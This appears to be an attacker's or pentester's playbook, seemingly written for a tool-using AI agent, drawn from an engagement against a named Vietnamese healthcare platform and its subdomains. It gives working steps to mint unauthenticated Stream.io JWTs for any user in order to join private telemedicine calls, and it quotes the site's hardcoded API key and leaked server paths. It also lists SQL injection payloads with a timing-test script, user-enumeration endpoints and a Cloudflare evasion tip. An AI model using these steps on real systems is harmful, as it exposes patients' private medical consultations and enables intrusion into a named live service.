# Next.js RSC JWT Extraction, Stream.io SDK Exposure, and CodeIgniter 3 SQL Error Disclosure

Three patterns discovered during the bcare.vn engagement (Aug 2026). Each is a class-level pattern that recurs across targets sharing the same tech stack.

---

## §1. Next.js RSC: JWT Tokens That Look Truncated But Aren't

### Symptom

A Next.js Server Component page renders a JWT (or other long token) inside a `<div>`. When you curl the page or read `document.getElementById('token').textContent`, the value appears to contain literal `...` in the middle:

```
eyJhbG...8kyo
```

### Diagnosis

The `...` is a **terminal/console display artifact**, not actual truncation. The token is the full length (e.g., 253 chars). JWTs use dots (`.`) as part separators (`header.payload.signature`), and depending on terminal width or console truncation, three consecutive dots in the JWT structure can render visually as `...`.

### Verification

```python
import base64, json, re, subprocess

# Extract from HTML
result = subprocess.run(
    ["curl", "-s", "https://target/create-token?userId=1"],
    capture_output=True, text=True, timeout=10
)
match = re.search(r'<div id="token">([^<]+)</div>', result.stdout)
token = match.group(1)

# Check actual length and content
print(f"Token length: {len(token)}")        # e.g., 253
print(f"'...' in token: {'...' in token}")   # False — it's a display artifact

# Verify it's a valid 3-part JWT
parts = token.split(".")
print(f"JWT parts: {len(parts)}")            # 3

# Decode each part
for i, part in enumerate(parts):
    padded = part + "=" * (4 - len(part) % 4)
    decoded = base64.urlsafe_b64decode(padded)
    print(f"  Part {i}: {decoded[:200]}")
```

### Key rule

**Always check `len()` and byte-level content before assuming truncation.** Never waste 5+ tool calls investigating "truncation" that doesn't exist. The token is complete — decode and use it directly.

---

## §2. Stream.io / GetStream SDK: Unauthenticated Token Generation + Hardcoded API Keys

### Where to find

Video calling / telemedicine apps that use the Stream.io (GetStream) video SDK. The client JS initializes the SDK with:

```javascript
new StreamVideoClient({
  apiKey: "pnwf8hccjv6n",   // ← hardcoded in JS, find via: grep -oP 'apiKey:"[^"]*"' app-page.js
  user: { id: userId, ... },
  tokenProvider: async () => {
    const res = await fetch("/create-token?userId=" + userId);
    const text = await res.text();
    const match = text.match(/<div id="token">(.*?)<\/div>/);
    return match?.[1] || null;
  }
})
```

### Exploitation pattern

1. **Extract API key** from the client JS bundle:
   ```bash
   grep -oP 'pnwf8[a-z0-9]+' /tmp/call_bcare_js/app-page.js
   ```
   Stream.io API keys are typically 12 chars, alphanumeric.

2. **Generate JWT for any userId** — the `/create-token` endpoint accepts a `userId` query parameter and returns a Stream.io-signed JWT with NO authentication:
   ```bash
   curl -s "https://target/create-token?userId=1" | grep -oP '<div id="token">\K[^<]+'
   ```

3. **Decode the JWT** to confirm structure:
   ```json
   {
     "iss": "https://pronto.getstream.io",
     "sub": "user/1",
     "user_id": "1",
     "validity_in_seconds": 604800,
     "iat": 1785725465,
     "exp": 1786330265
   }
   ```
   - `iss` identifies the Stream.io app/region
   - `sub` and `user_id` match the query parameter
   - 7-day validity (604800s)
   - HS256 signed by Stream.io backend — cannot be forged without the secret

4. **Test against Stream.io Video API**:
   ```bash
   curl -s "https://video.stream-io-api.com/video/call/default/test?api_key=KEY" \
     -H "stream-auth-type: jwt" \
     -H "Authorization: JWT_TOKEN"
   ```

   | Response | Meaning |
   |----------|---------|
   | `401 "Suspended"` | **Auth PASSED** — app is suspended at Stream.io level, not an auth failure |
   | `401 "Unauthorized"` | JWT rejected — wrong key or invalid token |
   | `200` | Auth passed, app active — **full exploitation possible** |
   | `404` | Wrong endpoint format — try different URL patterns |

5. **Key distinction**: `401 "Suspended: [This app has been suspended due to 90 days of no activity]"` means the JWT was **accepted** and the request reached the business logic. The 401 is an app-level suspension, NOT an authentication failure. When the app is reactivated, the same JWT will work.

6. **Distinguishing 404 from 401**: Stream.io returns `404` for wrong endpoint paths but `401` (Suspended) for correct paths with valid auth. Use this to enumerate valid API endpoints:
   - `GET /video/call/{type}/{id}` → 401 = endpoint exists, auth passed
   - `POST /video/calls` → 401 = endpoint exists, auth passed
   - `GET /video/calls` → 404 = wrong method or path
   - `GET /api/v2/me` (chat) → 404 = chat API not configured for this key

### Auth check is client-side only

The normal flow is:
1. Client fetches `https://internal-api/v2_api/kham_online_auth?userId=X&phongkhamId=Y`
2. If auth succeeds, client calls `/create-token?userId=X` for JWT
3. Client joins video call with JWT

But `/create-token` has **no server-side check** that the user passed step 1. An attacker skips directly to step 2.

### Impact

- Generate JWTs for ANY userId (sequential integers)
- Join telemedicine video calls as any user
- Access video/audio streams of private medical consultations
- Impersonate patients or doctors in calls

### CVSS

- AV:N / AC:L / PR:N / UI:N / S:U / C:H / I:H / A:L = **9.1 Critical**

---

## §3. CodeIgniter 3: SQL Error Disclosure via Empty Session Variables

### Symptom

A CodeIgniter 3 app returns a styled "A Database Error Occurred" page with full SQL query text, table names, file paths, and MariaDB error numbers when accessed without a valid session.

### Root cause

CI3 model code uses session variables directly in SQL queries without checking if they're empty:

```php
// Vulnerable pattern (mcosoyte.php line 730):
$this->db->where("cosoyte_bacsi_taikhoan_id = ", $this->session->userdata('taikhoan_id'));
// When session is empty: AND cosoyte_bacsi_taikhoan_id =  (empty value)
// → MariaDB 1064 syntax error
```

### What leaks

- **Full SQL query**: `SELECT * FROM cosoyte_bacsi WHERE 1=1 AND status = 1 AND cosoyte_bacsi_taikhoan_id = ORDER BY last_login DESC LIMIT 0,1`
- **Table name**: `cosoyte_bacsi`
- **File path**: `/www/tuvansuckhoe/doitac.bcare.vn/public_html/models/mcosoyte.php`
- **Line number**: 730
- **MariaDB version** (in error text)
- **PHP version** via `X-Powered-By: PHP/5.6.29` header

### SQLi testing matrix (what works vs what doesn't on CI3)

| Attack vector | Method | Result | Why |
|---------------|--------|--------|-----|
| Error-based (URI segment) | `GET /login/check_active/0900000000'` | ❌ Blocked | CI3 `$config['permitted_uri_chars']` filters special chars |
| Error-based (POST body) | `POST /login/check_login username=' AND EXTRACTVALUE(...)` | ❌ Returns "0" | CI3 Active Record parameterizes POST inputs |
| Time-based blind (password) | `POST password=' AND SLEEP(5)-- -` | ❌ No signal | Password is likely MD5-hashed before query |
| Session cookie forging | Inject `cosoyte_bacsi_taikhoan_id` in ci_session | ❌ Rejected | CI3 validates session_id against ci_sessions DB table |
| Error-based (username) | `POST username=' OR '1'='1` | ❌ Returns "0" | Parameterized query, no error |

**Conclusion**: The SQL error is **information disclosure**, not injectable SQLi. CI3's Active Record parameterizes user inputs for login queries. The leak comes from the session variable being empty (no user logged in), which bypasses parameterization because it's a server-side variable, not user input.

### Statistical SQLi testing protocol

When testing time-based blind SQLi, use proper interleaved sampling:

```python
import subprocess, time, random, statistics

samples = {"control": [], "sleep3": [], "sleep5": []}
payloads = {
    "control": "test",
    "sleep3": "test' AND SLEEP(3)-- -",
    "sleep5": "test' AND SLEEP(5)-- -"
}
order = []
for i in range(10):
    order.extend(["control", "sleep3", "sleep5"])
random.shuffle(order)

for name in order:
    cmd = ["curl", "-s", "-X", "POST", "https://target/login/check_login",
           "-d", f"username=0900000000&password={payloads[name]}",
           "-w", "\\n%{time_total}"]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
    elapsed = float(result.stdout.strip().split("\n")[-1])
    samples[name].append(elapsed)

# Signal requires ≥2σ above control mean
ctrl_mean = statistics.mean(samples["control"])
ctrl_std = statistics.stdev(samples["control"])
for name in ["sleep3", "sleep5"]:
    test_mean = statistics.mean(samples[name])
    sigma = (test_mean - ctrl_mean) / ctrl_std
    print(f"{name}: {sigma:.1f}σ above control → {'SIGNAL' if sigma > 2 else 'NO SIGNAL'}")
```

### What to report

- **Information Disclosure** (C:L/I:N/A:N) — CVSS 5.3 Medium, bumped to HIGH in healthcare context
- Leaked info aids further attacks (table names for API testing, file paths for LFI attempts, PHP version for CVE matching)
- Combined with PHP 5.6.29 (EOL Jan 2019) and CodeIgniter 3 (EOL), the stack itself is a finding in pentest/WAPT mode

### CI3 login AJAX endpoints

CI3 apps commonly expose AJAX login endpoints useful for user enumeration:

| Endpoint | Method | Response | Meaning |
|----------|--------|----------|---------|
| `/login/check_active/{phone}` | GET | `0` | User not active / not found |
| `/login/check_active/{phone}` | GET | `1` | User exists and is active |
| `/login/check_login` | POST | `0` | Wrong password |
| `/login/check_login` | POST | `1` (or redirect) | Login successful |
| `/login/check_login` | POST | `2` | Account not activated |

Note: Cloudflare may block Python `urllib` requests with `error code: 1010` on these endpoints. Use `curl` instead — it passes Cloudflare's browser check.

### CI3 session cookie format (for understanding, not exploitation)

```
ci_session=URL_ENCODE(a:5:{s:10:"session_id";s:32:"HASH";s:10:"ip_address";s:13:"IP";s:10:"user_agent";s:11:"UA";s:13:"last_activity";i:TIMESTAMP;s:9:"user_data";s:0:"";}MD5_HASH)
```

The cookie is `serialized_data + md5_hash` where the hash is computed using the CI3 `encryption_key` from `application/config/config.php`. Without the key, you cannot forge valid cookies.

---

## §4. Next.js API Enumeration via Status-Code Interpretation + execute_code Shell Argument Limit

### Next.js API status-code dictionary

When enumerating Next.js API routes (serverless functions under `/api/`), the status codes have precise meanings that let you map the API surface without authentication:

| Status | GET | POST | Meaning |
|--------|-----|------|---------|
| 404 | missing | missing | Route does not exist |
| 405 | exists | exists | Route exists but wrong HTTP method — try the other verb |
| 401 | exists | exists | Route exists, requires authentication |
| 400 | — | exists | Route exists, requires parameters (read the error message for field names) |
| 403 | exists | exists | Route exists, forbidden (CSRF/origin check or IP restriction) |
| 500 | exists | exists | Route exists, server error (may leak stack trace) |
| 200 | exists | exists | Route exists, public access |

**Workflow:** Send GET and POST to every candidate path. Any non-404 response means the endpoint exists. Then test with correct method + parameters based on the error message.

### Vietnamese localized paths

Next.js apps deployed in Vietnam commonly use localized route names instead of English defaults:

| English | Vietnamese | Notes |
|---------|-----------|-------|
| `/login` | `/dang-nhap` | May not appear in JS bundles (server-side route) |
| `/register` | `/dang-ky` | Same |
| `/account` | `/tai-khoan` | |
| `/booking` | `/dat-kham` | |
| `/doctor` | `/bacsi` | Often a subdomain instead |

**Rule:** When English paths return 404, try Vietnamese equivalents. The login page may also have a phone/email toggle (visible in the browser DOM, not in curl output — the form fields change client-side via React state).

### api.target.com — Always Check for a Separate API Subdomain

Many Next.js apps have a separate API server on `api.target.com` (or `api-dev`, `api-staging`). The main app proxies to it, but the API server itself may have different security rules, no WAF, or expose debug endpoints.

```bash
# Quick check
curl -sk https://api.target.com/  # Look for any non-404 response
curl -sk https://api.target.com/admin  # Admin endpoints may not be proxied through the main app
```

**Lesson from bcare.vn:** `api.bcare.vn` returned `welcome-2222222222111` (a debug/test string) on root and `/admin`, indicating a separate Express-style API server with different security posture from the Next.js frontend.

### execute_code: Shell Argument Limit (OSError: [Errno 7] Argument list too long)

When extracting API paths or secrets from JS bundles inside `execute_code`, **never** pipe 100KB+ of content through a shell command:

```python
# ❌ FAILS — content too large for shell argv
result = subprocess.run(f"echo '{huge_content}' | grep -oP '/api/[^\"\\']+'", shell=True)
# OSError: [Errno 7] Argument list too long: '/bin/sh'

# ✅ WORKS — download to file, process in Python
subprocess.run(f"curl -sk 'https://target/_next/static/chunks/{chunk}.js' -o /tmp/chunk_{chunk}", shell=True)
with open(f'/tmp/chunk_{chunk}', 'r', errors='ignore') as f:
    content = f.read()
api_paths = re.findall(r'["\'](/api/[^"\'`,\s)\]]+)["\']', content)
```

**Rule:** Any JS chunk >50KB will hit this limit when passed through `echo | grep`. Always `curl -o /tmp/file` first, then `open()` + `re.findall()` in Python. This also lets you run multiple regex patterns against the same file without re-downloading.

---

## Engagement source

bcare.vn (Vietnamese healthcare booking platform), August 2026. Three subdomains, three different stacks:

| Subdomain | Stack | Finding |
|-----------|-------|---------|
| `bcare.vn` | Next.js (turbopack) + Cloudflare | Modern, well-secured. API endpoints found via JS analysis. |
| `doitac.bcare.vn` | CodeIgniter 3 + PHP 5.6.29 + MariaDB | §3 — SQL error disclosure on all admin endpoints |
| `call.bcare.vn` | Next.js + Stream.io video SDK | §1 + §2 — Unauth JWT generation, hardcoded API key |
| `admin.bcare.vn` (origin IP) | nginx + Webmin 1.820 + MariaDB + FTP | Origin IP port scan revealed 12 open ports |

PoC script: `~/recon/bcare_jwt_exploit.py`
